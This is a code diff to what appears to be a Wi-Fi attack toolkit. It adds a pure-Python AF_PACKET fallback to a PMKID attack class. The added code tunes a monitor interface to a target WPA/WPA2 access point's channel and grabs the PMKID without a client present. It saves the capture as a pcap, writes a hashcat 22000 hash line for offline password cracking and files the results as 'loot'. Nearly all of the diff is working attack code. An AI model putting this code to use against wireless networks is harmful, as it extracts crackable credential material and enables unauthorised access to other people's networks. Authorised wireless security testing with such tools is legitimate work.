@@ -31,11 +31,13 @@ class PmkidAttack(Attack):
         return ap.encryption in ("WPA", "WPA2", "WPA2/WPA3")
 
     def available(self, ctx: AttackContext) -> bool:
-        return bool(ctx.demo or registry.has("hcxdumptool") or registry.has("tcpdump")
+        # Native PmkidGrabber needs only a monitor interface
+        return bool(ctx.demo or ctx.monitor
+                    or registry.has("hcxdumptool") or registry.has("tcpdump")
                     or registry.has("airodump-ng"))
 
     def unavailable_reason(self, ctx: AttackContext) -> str:
-        return "needs hcxdumptool (hcxtools) or tcpdump"
+        return "needs a monitor interface (native PMKID grabber) or hcxdumptool/tcpdump"
 
     # ---------------------------------------------------------------- #
     def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
@@ -52,8 +54,18 @@ class PmkidAttack(Attack):
             if outcome.status == STATUS_SUCCESS:
                 return outcome
             # fall through to the sniffing fallback on failure
-            ctx.bus.log("hcxdumptool produced no PMKID, falling back to passive sniff",
+            ctx.bus.log("hcxdumptool produced no PMKID, falling back to native grabber",
                         level="debug")
+        # Native AF_PACKET fallback — pure-Python PmkidGrabber
+        if not ctx.demo and ctx.monitor:
+            try:
+                outcome = self._run_native(ctx, ap, attempt)
+                if outcome.status == STATUS_SUCCESS:
+                    return outcome
+                ctx.bus.log("native PmkidGrabber produced no PMKID, falling back to passive sniff",
+                            level="debug")
+            except Exception as e:  # pragma: no cover
+                ctx.bus.log(f"native PmkidGrabber error: {e}", level="debug")
         return self._run_sniff(ctx, ap, attempt)
 
     # ---------------------------------------------------------------- #
@@ -142,6 +154,80 @@ class PmkidAttack(Attack):
                 os.unlink(out_path)
         return self._fail(ctx, attempt, "no PMKID returned by hcxdumptool",
                           "AP may not expose a PMKID for association requests")
+
+    # ---------------------------------------------------------------- #
+    def _run_native(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
+        """Pure-Python AF_PACKET PMKID grabber fallback (no hcxtools required)."""
+        import threading
+        from ..native.pmkid import PmkidGrabber, pmkid_to_hashcat22000
+        from ..native import radiotap
+        from ..synth import write_pcap
+        def _fmt(b: bytes) -> str:
+            return ":".join(f"{x:02x}" for x in b)
+
+        timeout = min(ctx.config.attack_timeout_for(self.name), 45)
+        cap_path = ctx.artifact_path("pmkid", ap, ".pcap")
+        ctx.set_channel(ap.channel)
+        ctx.bus.log(f"PMKID hunt (native AF_PACKET) on {ap.display_name} (ch {ap.channel}) — "
+                    f"up to {human_duration(timeout)}", level="info")
+        try:
+            grabber = PmkidGrabber(ctx.monitor, ap.bssid, ssid=ap.essid or "",
+                                   channel=ap.channel, timeout=timeout)
+        except OSError as e:
+            return self._fail(ctx, attempt, "native PmkidGrabber failed to open socket", str(e))
+
+        # Run grabber in a thread so we can report progress and respect stop.
+        result_box = {"result": None}
+
+        def _run_grabber():
+            try:
+                result_box["result"] = grabber.run()
+            except Exception as e:  # pragma: no cover
+                result_box["error"] = str(e)
+
+        th = threading.Thread(target=_run_grabber, daemon=True)
+        th.start()
+        started = time.time()
+        while th.is_alive() and not ctx.want_stop() and time.time() - started < timeout:
+            ctx.progress(f"PMKID hunt on {ap.display_name}", kind="capture",
+                         bssid=ap.bssid,
+                         percent=min(95, (time.time() - started) / max(1, timeout) * 100),
+                         detail=f"{len(ap.clients)} clients, native AF_PACKET grabber")
+            th.join(timeout=0.5)
+        if th.is_alive():
+            grabber._stop.set()  # ask it to quit
+            th.join(timeout=2.0)
+        result = result_box.get("result")
+        if not result or not result.pmkid:
+            return self._fail(ctx, attempt, "no PMKID returned by native grabber",
+                              "AP may not expose a PMKID for association requests")
+        sta_mac = _fmt(result.sta_mac)
+        # Save the captured M1 frame as the artifact pcap
+        frames = []
+        if result.m1_frame:
+            frames.append(radiotap.with_header(result.m1_frame))
+        if not frames:
+            # Synthesise a placeholder frame so the pcap is non-empty
+            frames.append(radiotap.with_header(result.m2_frame or b"\x00" * 40))
+        write_pcap(cap_path, frames)
+        # Write hashcat 22000 (WPA*01) line
+        hashcat_line = pmkid_to_hashcat22000(result.ap_mac, result.sta_mac, result.pmkid,
+                                             ap.essid or "", anonce=result.anonce)
+        hash_path = ctx.artifact_path("pmkid", ap, ".22000")
+        Path(hash_path).write_text(hashcat_line + "\n", encoding="utf-8")
+        saved = ctx.session.save_artifact(cap_path, "pmkid", ctx.loot_name(ap, "pmkid"))
+        hsaved = ctx.session.save_artifact(hash_path, "hashcat22000", ctx.loot_name(ap, "pmkid.22000"))
+        capture = Capture(kind="pmkid", bssid=ap.bssid, essid=ap.essid, path=saved,
+                          valid=True, tool="native (AF_PACKET)", eapol=1,
+                          hash_path=hsaved,
+                          extra={"pmkid": result.pmkid.hex(),
+                                 "mac_ap": ap.bssid, "mac_sta": sta_mac})
+        ctx.session.add_capture(capture)
+        ctx.session.end_attempt(attempt, STATUS_SUCCESS, "PMKID captured",
+                                "client-less PMKID via native AF_PACKET grabber", capture)
+        ctx.bus.log(f"PMKID captured for {ap.display_name} (native)", level="success")
+        return AttackOutcome.success("PMKID captured", capture,
+                                     "client-less PMKID via native AF_PACKET grabber")
 
     # ---------------------------------------------------------------- #
     def _run_sniff(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt) -> AttackOutcome:
